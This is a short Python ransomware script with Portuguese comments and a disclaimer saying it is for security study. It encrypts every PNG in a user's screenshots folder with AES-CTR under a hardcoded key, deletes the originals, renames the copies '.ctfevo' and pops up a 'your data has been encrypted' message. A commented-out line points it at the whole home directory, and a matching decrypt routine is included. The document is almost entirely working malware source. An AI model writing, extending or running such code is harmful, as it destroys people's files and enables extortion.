"""_________________________________________________________________________________
ESTE CODIGO TEM COMO FINALIDADE MEUS ESTUDOS NA AREA DE SEGURANÇA DA INFORMAÇÃO.
PORFAVOR NÃO USA-LO DE MANEIRA ILEGAL.
_________________________________________________________________________________"""

import os
import glob
import pyaes
from pathlib import Path
import ctypes

type_archive = ["*.png"]
type_crypto = ["*.ctfevo"]
desktop = "C:\\Users\\leona\\OneDrive\\Pictures\\Capturas de tela"
os.chdir(desktop)

# cripritografando toda a maquina.
# desktop = Path.home()

def criptation():
    for files in type_archive:
        for formmat_file in glob.glob(files):
            #abrindo arquivo
            file_name = f'{desktop}\\{formmat_file}'
            file = open(file_name,"rb")
            file_date = file.read()
            file.close()
            #removendo arquivo
            os.remove(file_name)
            #chave de criptografia
            key = b"a12vcd5678za245b"  #chave de 16 bits
            aes = pyaes.AESModeOfOperationCTR(key)
            #criptografar arquivos
            crypto_date = aes.encrypt(file_date)
            #salvar arquivo criptado
            new_file_name = f'{file_name}' + ".ctfevo"
            new_file = open(f'{new_file_name}',"wb")
            new_file.write(crypto_date)
            new_file.close()

    ctypes.windll.user32.MessageBoxW(0,"SEUS DADOS FORAM CRIPTOGRAFADOS.") 

def decript():
    for files in type_crypto:
        for formmat_file in glob.glob(files):
            file_name = f'{desktop}\\{formmat_file}'
            with open(file_name, "rb") as file:
                file_data = file.read()

            # Chave de criptografia (deve ser a mesma usada na criptografia)
            key = b"a12vcd5678za245b"  # chave de 16 bytes
            aes = pyaes.AESModeOfOperationCTR(key)

            # Descriptografa os dados
            decrypted_data = aes.decrypt(file_data)

            # Remove a extensão ".ctfevo" do nome do arquivo
            new_file_name = file_name.replace('.ctfevo', '')

            # Salva o arquivo descriptografado
            with open(new_file_name, "wb") as new_file:
                new_file.write(decrypted_data)

            # Remove o arquivo criptografado
            os.remove(file_name)

    print('ARQUIVOS DECRIPTADOS')

if __name__ == '__main__':
    criptation()
    #decript()